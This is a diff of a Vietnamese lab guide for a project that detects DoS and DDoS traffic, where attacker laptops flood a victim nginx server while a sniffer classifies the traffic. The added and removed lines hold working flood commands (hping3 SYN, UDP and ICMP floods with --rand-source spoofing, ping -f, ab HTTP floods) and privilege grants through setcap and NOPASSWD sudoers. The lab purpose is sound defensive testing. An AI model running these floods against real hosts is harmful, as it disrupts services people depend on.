@@ -21,8 +21,8 @@ DHCP cấp (động), mọi IP truyền qua tham số lúc chạy.
 | Vai trò   | Máy        | Chạy gì                                        | Cần cài |
 |-----------|------------|------------------------------------------------|---------|
 | victim    | 1 laptop   | nginx (web đích) + `detector.py` (sniff WiFi)  | nginx, python3-scapy, tcpdump |
-| attacker1 | 1 laptop   | `syn_flood.py` / `http_flood.py`               | python3-scapy, hping3, apache2-utils |
-| attacker2 | thêm sau   | giống attacker1                                | giống attacker1 |
+| attacker1 | 1 laptop   | `hping3` (L3/L4) / `ab` (L7 HTTP)              | hping3, apache2-utils |
+| attacker2 | thêm sau   | giống attacker1                                | hping3, apache2-utils |
 
 Bắt đầu với **2 máy** (1 victim + 1 attacker1) là đủ chạy kịch bản A, B, và C-1-nguồn. Thêm máy
 thứ 3 (attacker2) khi nào cần C thành DDoS thật (xem mục 7).
@@ -61,7 +61,7 @@ sudo systemctl enable --now nginx           # nginx phục vụ ở cổng 80
 Trên **mỗi attacker**:
 ```bash
 sudo apt update
-sudo apt install -y python3-scapy hping3 apache2-utils
+sudo apt install -y hping3 apache2-utils
 ```
 
 ## 4. Deploy repo lên mỗi máy
@@ -94,56 +94,47 @@ Engine mặc định là `scapy` (ổn định trên WiFi). `--engine ebpf` (XDP
 card WiFi (nhiều driver không hỗ trợ XDP native); nếu muốn thử thì thêm `--engine ebpf`, lỗi thì quay
 lại scapy.
 
-## 6. Chạy 3 kịch bản A / B / C
+## 6. Chạy các kịch bản thực tế (100% dùng hping3 và ab)
 
-Thay `192.168.1.50` bằng IP victim thật. Chạy các lệnh tấn công TRÊN MÁY ATTACKER (1 attacker hiện
-tại: chạy trực tiếp, KHÔNG cần SSH).
+Thay `192.168.1.50` bằng IP victim thật. Chạy các lệnh kiểm thử TRÊN MÁY ATTACKER:
 
-### A — DoS (1 nguồn, SYN, không spoof)
+### A — DoS TCP SYN Flood (1 nguồn)
 ```bash
-sudo python3 ~/dos-ddos-project/attacks/syn_flood.py 192.168.1.50 -p 80 --pps 400
+sudo hping3 -S -p 80 -i u2000 192.168.1.50
 ```
-Detector: `n_src=1` → **DoS** `[SYN flood]`. (SYN flood cần `sudo` vì mở raw socket — xem mục 9.)
+Detector: `n_src=1` → **DoS** `[SYN flood]`. Thêm `--flood` nếu muốn tốc độ tối đa.
 
-### B — DDoS (1 nguồn, SYN + spoof IP giả)
+### B — DDoS TCP SYN Flood (IP Spoofing hoặc 2 máy cùng bắn)
 ```bash
-sudo python3 ~/dos-ddos-project/attacks/syn_flood.py 192.168.1.50 -p 80 --spoof --pps 400
+# 1 máy dùng spoof ngẫu nhiên IP:
+sudo hping3 -S -p 80 --rand-source -i u2000 192.168.1.50
+# Hoặc cả Attacker 1 và Attacker 2 cùng chạy lệnh ở kịch bản A.
 ```
-Detector: nhiều IP nguồn giả → `n_src>=2` → **DDoS** `[SYN flood]`.
-LƯU Ý: AP WiFi có thể LỌC gói có source IP khác IP được cấp cho máy (chống spoof) → B có thể không
-ra nhiều nguồn. Nếu vậy: dùng nhiều attacker THẬT (giống C 2 máy) để có DDoS thật.
+Detector: nhiều IP nguồn → `n_src>=2`, Entropy $H(src)$ cao → **DDoS** `[SYN flood]`.
 
-### C — L7 (HTTP flood)
+### C — DDoS L7 HTTP Flood (Apache Benchmark)
 ```bash
-python3 ~/dos-ddos-project/attacks/http_flood.py 192.168.1.50 -p 80 -t 20 -d 30
+ab -k -c 50 -n 30000 http://192.168.1.50/
 ```
-HTTP là kết nối THẬT nên IP nguồn = IP máy thật. **1 máy attacker → n_src=1 → hiện DoS**, KHÔNG
-phải DDoS. Cần **2 máy attacker** mới ra DDoS L7 thật (mục 7). HTTP flood KHÔNG cần `sudo`.
+HTTP là kết nối TCP thật. Khi cả 2 máy attacker cùng chạy lệnh này: `n_src=2` → hiện **DDoS** `[HTTP Flood (L7)]`. Web service latency tăng vọt. `ab` KHÔNG cần quyền `sudo`.
 
-### D — UDP flood (volumetric L3/4)
+### D — UDP Flood (L4 Volumetric)
 ```bash
-# DoS (1 nguồn, không spoof) → n_src=1:
-sudo python3 ~/dos-ddos-project/attacks/udp_flood.py 192.168.1.50 -p 80 --pps 400
-# Hoặc dùng hping3:
+# DoS (1 nguồn):
 sudo hping3 --udp -p 80 -i u2000 192.168.1.50
-
-# DDoS (spoof IP giả hoặc 2 máy cùng bắn):
-sudo python3 ~/dos-ddos-project/attacks/udp_flood.py 192.168.1.50 -p 80 --spoof --pps 400
+# DDoS (cả 2 máy cùng bắn hoặc thêm --rand-source):
+sudo hping3 --udp -p 80 --rand-source -i u2000 192.168.1.50
 ```
-Detector: `pps` cao, **`udp_s` cao**, `syn/s` và `ack/s` ~0 → tag **`[UDP flood]`** (phân loại DoS
-hay DDoS vẫn theo `n_src` như thường).
+Detector: `pps` cao, **`udp_s` cao**, `syn/s` và `ack/s` ~0 → tag **`[UDP flood]`**.
 
 ### E — ICMP Echo Flood (Ping Flood L3)
 ```bash
-# DoS (1 nguồn, không spoof) → n_src=1:
-sudo python3 ~/dos-ddos-project/attacks/icmp_flood.py 192.168.1.50 --pps 400
-# Hoặc dùng hping3:
+# DoS (1 nguồn):
 sudo hping3 --icmp -i u2000 192.168.1.50
-# Hoặc dùng ping flood:
+# Hoặc dùng ping flood chuẩn Linux:
 sudo ping -f -s 1024 192.168.1.50
-
-# DDoS (spoof IP giả hoặc 2 máy cùng bắn):
-sudo python3 ~/dos-ddos-project/attacks/icmp_flood.py 192.168.1.50 --spoof --pps 400
+# DDoS (cả 2 máy cùng bắn hoặc thêm --rand-source):
+sudo hping3 --icmp --rand-source -i u2000 192.168.1.50
 ```
 Detector: `pps` cao nhưng `SYN=0, ACK=0, UDP=0` → nhận diện **`[ICMP Flood (L3)]`**.
 
@@ -194,29 +185,17 @@ Các cờ: `-t` IP victim, `-d` giây, `-a` user@ip (lặp lại), `-r` pps/ngu�
 400), `-s` thêm sudo cho SYN/UDP (chỉ khi dùng NOPASSWD sudoers thay vì CAP_NET_RAW — mục 9). Repo
 trên máy attacker mặc định `~/dos-ddos-project`; đổi bằng biến `REMOTE_REPO=/đường/dẫn ./run_ddos_remote.sh ...`.
 
-## 9. SYN / UDP flood cần quyền raw socket (sudo / CAP_NET_RAW)
+## 9. Quyền hạn khi chạy hping3 (sudo / raw socket)
 
-`syn_flood.py` và `udp_flood.py` mở raw socket (scapy) nên cần quyền root. `http_flood.py` KHÔNG cần.
+`hping3` mở raw socket để tạo gói L3/L4 nên cần quyền root (`sudo`). `ab` là HTTP client tầng ứng dụng thông thường nên KHÔNG cần sudo.
 
-- **1 attacker, chạy tay trên máy đó:** chỉ cần `sudo python3 .../syn_flood.py ...` (hoặc
-  `.../udp_flood.py ...`) — mục 6. Không vướng gì.
-- **Bắn SYN/UDP song song qua SSH từ >=2 máy** (`run_ddos_remote.sh`): SSH không-tương-tác không nhập
-  được mật khẩu sudo. Chọn 1 trong 2 cách SAU, cấu hình trên MỖI máy attacker:
-
-**Cách 1 (KHUYẾN DÙNG cho lab) — CAP_NET_RAW cho python3:** không cần sudo, không cần cờ `-s`.
+- **Chạy trực tiếp bằng tay trên máy attacker:** Thêm `sudo` trước lệnh `hping3`: `sudo hping3 ...`
+- **Bắn tự động qua SSH (`run_ddos_remote.sh`):** Cần cấp quyền chạy hping3 không hỏi mật khẩu:
 ```bash
-sudo setcap cap_net_raw+eip "$(readlink -f "$(command -v python3)")"
-# kiểm tra:
-getcap "$(readlink -f "$(command -v python3)")"
-```
-> ⚠️ CẢNH BÁO: lệnh này cấp quyền raw socket cho **mọi** chương trình python3 trên máy đó (không
-> riêng syn_flood). Chấp nhận được trong lab cô lập trên máy học tập; GỠ lại sau khi xong:
-> `sudo setcap -r "$(readlink -f "$(command -v python3)")"`.
-
-**Cách 2 — NOPASSWD sudoers:** cho phép chạy sudo không hỏi mật khẩu, rồi dùng cờ `-s`.
-```bash
-# trên máy attacker, tạo file sudoers (thay 'user' bằng user của bạn):
-echo 'user ALL=(root) NOPASSWD: /usr/bin/timeout, /usr/bin/python3' | sudo tee /etc/sudoers.d/dos-lab
+# Trên máy attacker:
+sudo setcap cap_net_raw+eip "$(command -v hping3)"
+# Hoặc thêm vào sudoers:
+echo "$USER ALL=(root) NOPASSWD: /usr/sbin/hping3, /usr/bin/hping3" | sudo tee /etc/sudoers.d/dos-lab
 sudo chmod 440 /etc/sudoers.d/dos-lab
 ```
 Rồi bắn kèm `-s`: `./run_ddos_remote.sh syn ... -s`. Cách này cũng nới quyền (cho chạy python3 bất
